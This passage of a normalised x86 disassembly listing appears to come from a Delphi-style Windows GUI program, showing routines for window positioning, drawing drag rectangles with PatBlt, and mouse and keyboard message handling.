call sub_472314
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_46ebd8
sub_471718
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_471750
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
call sub_46ee04
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_47175c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_471798
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_471804
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_471830
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_470df0
mov edi eax
mov eax [ ebx + 0x40 ]
call sub_470ddc
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x30 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x4c ]
fld [ esp ]
call sub_404638
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_404638
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x4c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x1eb ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x14 ]
call sub_479ce0
push eax
call GetWindowRect
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x1eb ] 0x0
je r-xdata
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
movzx edx [ ebx + 0x5c ]
push edx
lea edx [ ebx + 0x4c ]
push edx
mov eax [ eax + 0x1c8 ]
mov ecx [ ebx + 0x60 ]
mov edx [ ebx + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_47191c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_471948
push ebx
push esi
push ecx
mov ebx edx
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov [ esp ] edx
mov ecx esp
mov esi eax
mov edx eax
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov eax [ esp ]
mov [ ebx ] eax
sub_471978
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
push eax
movzx ecx [ edi + 0xd ]
movzx edx [ edi + 0xc ]
mov eax ebp
mov si 0xffd6
call sub_40587c
and eax 0x7f
mov [ ebx + 0xc ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4719ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x2 ] dx
mov edi eax
mov [ ebp - 0xd ] 0x0
cmp [ edi + 0x142 ] 0x0
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xd ]
push eax
movzx ecx [ ebp - 0x2 ]
mov edx edi
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ edi + 0x94 ] ebx
jmp r-xdata
mov eax [ edi + 0x94 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
cmp [ edi + 0x94 ] 0x0
setl bl
mov eax [ edi + 0x94 ]
cdq
xor eax edx
sub eax edx
sub eax 0x78
mov [ edi + 0x94 ] eax
test bl bl
je r-xdata
lea ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x2 ]
mov eax edi
mov si 0xffe2
call sub_40587c
mov [ ebp - 0xd ] al
cmp [ edi + 0x94 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x2 ]
mov eax edi
mov si 0xffe3
call sub_40587c
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ edi + 0x94 ]
neg eax
mov [ edi + 0x94 ] eax
sub_471a80
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dx
mov [ esp + 0xc ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
movzx eax [ esp + 0xc ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
push edx
lea edx [ esp + 0x10 ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_471acc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dx
mov [ esp + 0xc ] 0x0
cmp [ eax + 0x152 ] 0x0
je r-xdata
movzx eax [ esp + 0xc ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
push edx
lea edx [ esp + 0x10 ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
sub_471b18
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x4c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x64
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_471c33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x48 ]
call sub_44cd7c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c3a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_471c64
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ esp ]
call sub_470990
movzx eax [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_405830
mov esi [ eax + 0x40 ]
mov eax [ esp + 0xc ]
push eax
movzx eax [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x14 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffe0
call sub_40587c
mov eax [ esp + 0xc ]
push eax
movzx eax [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x14 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc3
call sub_40587c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40587c
mov eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb5
call sub_40587c
jmp r-xdata
sub_471d54
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0x90 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x20 ] eax
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
cmp [ eax + 0x1eb ] 0x0
je r-xdata
mov eax ebx
call sub_472398
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_470ddc
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax ebx
call sub_470df0
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
call sub_40ac8c
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_471f40
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_47085c
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x90 ]
mov ecx ebx
mov edx edi
mov si 0xffbd
call sub_40587c
test al al
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x24 ]
mov eax [ eax + 0x1c8 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebx + 0x90 ]
call sub_479ce0
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46df84
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_471f2a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0x90 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_479ce0
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x14 ] edi
mov eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
mov [ eax + 0x5c ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x4c ]
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
push 0x1
lea eax [ ebp - 0x14 ]
push eax
mov eax edi
call sub_479ce0
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb5
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
push 0x2
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4706f0
test esi esi
je r-xdata
sub_471f40
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0x90 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbd
call sub_40587c
test al al
jne r-xdata
movzx eax [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax edi
call sub_473640
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x4 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40587c
mov eax esi
call sub_47078c
push eax
lea eax [ esp + 0x18 ]
push eax
mov eax esi
call sub_47074c
mov ecx eax
xor edx edx
xor eax eax
call sub_40ab90
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40587c
jmp r-xdata
mov [ esp ] al
cmp [ esp ] 0x0
je r-xdata
sub_471fe0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor edx edx
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x90 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp [ eax + 0x1eb ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_472083
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_471d54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push edx
movzx edx [ ebp + 0x8 ]
push edx
push ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
mov edx eax
sub_4720e4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xb2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_472114
push ebx
push esi
add esp 0xffffffec
mov [ esp + 0x8 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5d ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x8 ]
mov eax [ eax ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0xc ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
movzx edx [ esi + 0x5d ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0xc ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x14
pop esi
pop ebx
retn
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_472180
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_472240
sub_4721b0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_4721e0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_470990
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47220c
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_472240
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edx [ eax + 0x70 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x70 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x70 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x70 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov edi [ eax ]
call [ edi + 0x3c ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ ebx ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esi ] eax
sub_472314
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_472370
mov edx [ eax + 0x16c ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
mov eax edx
retn
test edx edx
jne r-xdata
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
mov eax ecx
call sub_472370
mov edx eax
sub_472398
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
je r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x9c ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x98 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x8c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa4 ] eax
jmp r-xdata
mov eax [ ebx + 0x90 ]
movzx eax [ eax + 0x5d ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x8c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa0 ] eax
mov eax [ ebx + 0x90 ]
movzx eax [ eax + 0x5d ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_47240c
push ebx
mov ebx eax
mov eax [ edx ]
mov [ ebx + 0x40 ] eax
mov eax [ edx + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebx + 0x48 ] eax
mov eax [ edx + 0xc ]
sub eax [ edx + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4702b4
mov eax ebx
call sub_474070
pop ebx
retn
sub_472440
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
xor edx edx
mov eax esi
call sub_4946a4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x109
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x2bc ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20e
ja r-xdata
mov dl 0x1
mov eax esi
call sub_4946a4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x2bc ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4709ec
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x114 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
add eax 0xfffffe00
cmp eax 0x7
ja r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_472519 ]
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4a16f4
jmp r-xdata
test [ esi + 0x52 ] 0x8
je r-xdata
cmp [ esi + 0x5f ] 0x1
jne r-xdata
and [ esi + 0x54 ] 0xfffffffe
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
mov eax [ r-xdata ]
and eax [ esi + 0x54 ]
mov edx [ r-xdata ]
cmp edx eax
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffee
call sub_40587c
jmp r-xdata
lea eax [ ebp - 0x11a ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x11a ]
call sub_4945a0
mov [ ebp - 0xc ] ax
movzx eax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov edx [ ebx + 0x8 ]
mov eax edx
and eax 0xffff
shr edx 0x10
mov [ ebp - 0x1a ] ax
mov [ ebp - 0x18 ] dx
mov eax [ ebp - 0x1a ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40587c
jmp r-xdata
mov eax [ rw-data ]
call sub_47f8f0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_47f860
mov [ ebp - 0x15 ] 0x0
mov eax [ rw-data ]
mov edi [ eax + 0x28 ]
test edi edi
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a1850
jmp r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax esi
call sub_479ce0
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xf4 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_47f9cc
jmp r-xdata
xor edx edx
mov eax esi
call sub_4946a4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x34 ]
call sub_479ce0
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xf4 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_479ce0
mov edx eax
mov eax [ rw-data ]
mov eax [ eax + 0x28 ]
mov ecx esi
mov edi [ eax ]
call [ edi + 0xf4 ]
mov [ ebp - 0x15 ] al
sub_472728
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4128cc
mov edi eax
mov eax [ esi + 0x174 ]
call sub_4128f8
mov [ esi + 0x174 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_4709ec
dec eax
je r-xdata
mov eax [ esi + 0x174 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x174 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
